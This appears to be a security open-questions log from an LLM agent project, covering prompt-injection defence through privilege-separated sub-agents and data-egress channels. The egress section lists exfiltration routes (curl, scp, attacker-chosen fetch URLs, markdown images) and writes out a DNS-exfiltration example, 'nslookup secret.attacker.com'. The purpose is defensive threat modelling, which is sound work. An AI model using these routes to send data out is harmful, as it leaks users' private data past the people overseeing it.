# Security open-questions log

Status: **open-questions log** — mitigations under consideration,
open observations, and prior-art notes that haven't graduated yet.
Promote an entry into a real plan (or its own long-form `design/ideas/` note)
when the friction shows up.

The *committed* model lives in [`../SECURITY.md`](../../SECURITY.md): a
short code-trust baseline (pikuri + LLM trusted, no code you didn't
write), then the load-bearing prompt-injection section (lethal trifecta
broken by privilege-separated sub-agents), and explicit non-goals. This
file is the not-yet-committed counterpart. The open questions about
the shell and MCP moved to
[pikuri-workshop's log](https://github.com/mvysny/pikuri-workshop/blob/master/design/ideas/security-open-questions.md)
with those gems; skill-description injection, the `bash`-egress
allowlist, the uniform output cap and provenance tags followed on
2026-11-21, being features no pikuri promise waits on.

Threat model scales with capability. `bin/pikuri-chat` today is
small surface (calculator + three stateless network-out tools, no
filesystem writes); the planned secretary reads your mail, calendar
and notes, writes notes and searches the web, and adds the
privacy-of-personal-data axis.

Related long-form notes:

- `book/trifecta-detector.md` + {Pikuri::Trifecta} — the static
  capability-presence check, **shipped**, with nothing outstanding; its
  forks are `D_egress_axis_shape`, `D_trifecta_map_orphans`,
  `D_write_custody_axis` and `D_no_static_poisoned_flag`.
- In pikuri-workshop, since 2026-11-21:
  [`private-context-taint.md`](https://github.com/mvysny/pikuri-workshop/blob/master/design/ideas/private-context-taint.md)
  (the runtime private-in → sever-egress enforcement, Sealed / Bounded /
  Off, and why a user-curated `fetch` allowlist is dead),
  [`typed-transports.md`](https://github.com/mvysny/pikuri-workshop/blob/master/design/ideas/typed-transports.md)
  (private vs public LLM endpoints; a pikuri tree rides one transport,
  so it can't mix),
  [`bash-confirmer.md`](https://github.com/mvysny/pikuri-workshop/blob/master/design/ideas/bash-confirmer.md)
  and [`more-confirmers.md`](https://github.com/mvysny/pikuri-workshop/blob/master/design/ideas/more-confirmers.md)
  (approval fatigue, structured requests, the ingest gate), and
  [`templated-subagent-replies.md`](https://github.com/mvysny/pikuri-workshop/blob/master/design/ideas/templated-subagent-replies.md).

## Egress is broader than `web_search`

Anywhere bytes leave the box: `bash` → curl/scp/dns/`ping -p`;
`fetch` with attacker-chosen URL; `write` into a Dropbox / iCloud /
git-tracked directory; markdown images rendered by a chat host that
fetches them; error messages echoed back into follow-up turns; the
LLM provider itself when non-local. DNS exfil
(`nslookup secret.attacker.com`) is sneaky — 60+ bytes per query, and
most egress firewalls don't filter port 53. This is why the trifecta
detector's `:egress` leg is tagged generously (an undeclared tool is
presumed to hold it — {Pikuri::Tool::TrifectaLegs::ASSUMED}), and why the killed
`fetch` whitelist can't be rescued by URL-shape heuristics (see
pikuri-workshop's [`private-context-taint.md`](https://github.com/mvysny/pikuri-workshop/blob/master/design/ideas/private-context-taint.md)).

## Misc smaller things

- **`URLCache` on disk.** Cached pages with embedded auth cookies or
  sensitive scrape results — disk encryption matters, backups matter.
- **Sub-agent context leak.** A child given less context than the
  parent can still leak parent context that flows in via the parent's
  "task" prompt.

## Prior art: how PI and opencode handle this

The deep survey of PI's two isolation weights (the bubblewrap-only
`sandbox` extension and the heavier Gondolin micro-VM, with its
egress-proxy + secret-placeholder pattern) and opencode's
tree-sitter-backed `(permission, glob)` permission system — plus the
"worth borrowing" shortlist — now lives in
pikuri-workshop's `pikuri-workshop:R_permissions`, alongside
the higher-level permission/sandboxing comparison it extends. Findings
reinforce pikuri's framing rather than contradict it: neither project
ships prompt-injection defenses, both cap tool output to a tempfile,
both validate sub-agent privilege separation as the right shape.
